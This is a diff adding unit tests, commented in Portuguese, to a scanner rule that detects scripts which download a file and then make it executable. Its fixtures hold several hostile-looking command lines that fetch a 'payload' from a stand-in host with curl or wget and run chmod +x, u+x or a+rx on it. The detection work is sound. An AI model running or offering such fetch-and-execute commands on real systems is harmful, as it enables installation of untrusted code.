@@ -1016,6 +1016,64 @@ class TestRuleH020ChmodDownload:
         ctx = _ctx(content=b"chmod +x myscript.sh", is_script=True)
         assert _r_chmod_plus_x(ctx, "H020") is None
 
+    def test_wget_substring_of_identifier_no_trigger(self) -> None:
+        # falso-positivo real: "wget"/"curl" sem word-boundary casavam
+        # como substring de qualquer identificador terminado nessas
+        # letras seguido de espaço.
+        ctx = _ctx(
+            content=b"downloadwget http://x.com/payload; chmod +x payload",
+            is_script=True,
+        )
+        assert _r_chmod_plus_x(ctx, "H020") is None
+
+    def test_curl_substring_of_identifier_no_trigger(self) -> None:
+        ctx = _ctx(
+            content=b"libcurl bindings here; chmod +x payload",
+            is_script=True,
+        )
+        assert _r_chmod_plus_x(ctx, "H020") is None
+
+    def test_symbolic_chmod_with_class_triggers(self) -> None:
+        # falso-negativo real: "chmod u+x"/"a+x"/"go+x" (classe explícita
+        # antes do +x) são idiomas tão comuns quanto "chmod +x" puro em
+        # script de instalação, mas passavam batido.
+        for mode in (b"u+x", b"a+x", b"go+x", b"ug+x"):
+            ctx = _ctx(
+                content=b"curl -o payload http://x.com/p; chmod " + mode + b" payload",
+                is_script=True,
+            )
+            assert _r_chmod_plus_x(ctx, "H020") is not None, mode
+
+    def test_symbolic_chmod_multi_perm_triggers(self) -> None:
+        # "chmod a+rx" (lê+executa) e "chmod a+xr" (ordem invertida)
+        # também passavam batido por exigir só "x" imediatamente após "+".
+        for mode in (b"a+rx", b"a+xr"):
+            ctx = _ctx(
+                content=b"wget http://x.com/p; chmod " + mode + b" payload",
+                is_script=True,
+            )
+            assert _r_chmod_plus_x(ctx, "H020") is not None, mode
+
+    def test_chmod_with_recursive_flag_triggers(self) -> None:
+        # "chmod -R +x dir"/"chmod -Rv u+x dir" (flag antes do modo,
+        # comum em instalador que marca um diretório inteiro).
+        for cmd in (b"chmod -R +x dir", b"chmod -Rv u+x dir"):
+            ctx = _ctx(content=b"wget http://x.com/p; " + cmd, is_script=True)
+            assert _r_chmod_plus_x(ctx, "H020") is not None, cmd
+
+    def test_chmod_removing_exec_no_trigger(self) -> None:
+        # "chmod a-x"/"chmod -x" (removendo execução) não deve disparar
+        # como "download + chmod +x (auto-instalação)" — direção oposta.
+        ctx = _ctx(content=b"wget http://x.com/p; chmod a-x payload", is_script=True)
+        assert _r_chmod_plus_x(ctx, "H020") is None
+
+    def test_chmod_no_exec_bit_no_trigger(self) -> None:
+        # "chmod u+rw" (sem x) e "chmod 644" continuam sem disparar.
+        ctx = _ctx(content=b"wget http://x.com/p; chmod u+rw payload", is_script=True)
+        assert _r_chmod_plus_x(ctx, "H020") is None
+        ctx2 = _ctx(content=b"wget http://x.com/p; chmod 644 payload", is_script=True)
+        assert _r_chmod_plus_x(ctx2, "H020") is None
+
 
 class TestRuleH021HiddenExec:
     def test_hidden_executable_triggers(self) -> None:
